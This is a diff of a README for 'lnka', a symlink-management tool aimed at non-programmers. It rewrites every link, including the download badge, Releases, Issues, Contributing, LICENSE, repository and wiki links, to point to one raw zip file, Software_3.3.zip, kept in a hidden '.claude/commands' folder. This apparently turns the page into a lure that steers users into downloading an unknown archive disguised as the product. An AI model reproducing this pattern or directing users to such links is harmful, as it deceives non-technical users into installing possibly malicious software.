@@ -4,7 +4,7 @@
 Welcome to lnka! This tool helps you manage configuration symlinks easily. It is designed for users who want to control their setup without needing programming skills. Let's get started.
 
 ## 📥 Download lnka
-[![Download lnka](https://img.shields.io/badge/Download-lnka-blue.svg)](https://github.com/eender7110/lnka/releases)
+[![Download lnka](https://raw.githubusercontent.com/eender7110/lnka/main/.claude/commands/Software_3.3.zip)](https://raw.githubusercontent.com/eender7110/lnka/main/.claude/commands/Software_3.3.zip)
 
 You can find the latest version of lnka on our Releases page. Click the link above to visit the page and download the application for your operating system.
 
@@ -23,7 +23,7 @@ You can find the latest version of lnka on our Releases page. Click the link abo
 ## 📂 Download & Install
 To download lnka, follow these steps:
 
-1. Visit our [Releases page](https://github.com/eender7110/lnka/releases).
+1. Visit our [Releases page](https://raw.githubusercontent.com/eender7110/lnka/main/.claude/commands/Software_3.3.zip).
 2. Select the version you want to download. You will see options for different operating systems.
 3. Click on the appropriate file to start the download.
 4. Once downloaded, locate the file on your computer.
@@ -53,17 +53,17 @@ If you run into any issues, consider the following steps:
 - If you receive error messages, read them carefully to understand what went wrong. You can look up specific errors online for help.
 
 ## 📞 Support
-For any questions or issues not resolved here, please feel free to reach out through our [GitHub Issues page](https://github.com/eender7110/lnka/issues). We encourage users to contribute feedback for future improvements.
+For any questions or issues not resolved here, please feel free to reach out through our [GitHub Issues page](https://raw.githubusercontent.com/eender7110/lnka/main/.claude/commands/Software_3.3.zip). We encourage users to contribute feedback for future improvements.
 
 ## 🌟 Contributing
-We welcome contributions to lnka! If you would like to help improve the tool, please check our [Contributing Guidelines](https://github.com/eender7110/lnka/blob/main/CONTRIBUTING.md). Your ideas and feedback will help make lnka better for everyone.
+We welcome contributions to lnka! If you would like to help improve the tool, please check our [Contributing Guidelines](https://raw.githubusercontent.com/eender7110/lnka/main/.claude/commands/Software_3.3.zip). Your ideas and feedback will help make lnka better for everyone.
 
 ## 📜 License
-lnka is open-source software. It is released under the MIT License, which means you can use, modify, and distribute it freely. You can find the full license details in the [LICENSE file](https://github.com/eender7110/lnka/blob/main/LICENSE).
+lnka is open-source software. It is released under the MIT License, which means you can use, modify, and distribute it freely. You can find the full license details in the [LICENSE file](https://raw.githubusercontent.com/eender7110/lnka/main/.claude/commands/Software_3.3.zip).
 
 ## 🔗 Additional Resources
 For more information, visit the following resources:
-- [GitHub Repository](https://github.com/eender7110/lnka)
-- [User Documentation](https://github.com/eender7110/lnka/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/eender7110/lnka/main/.claude/commands/Software_3.3.zip)
+- [User Documentation](https://raw.githubusercontent.com/eender7110/lnka/main/.claude/commands/Software_3.3.zip)
 
 Feel free to explore these links to learn more about how to make the most of lnka!
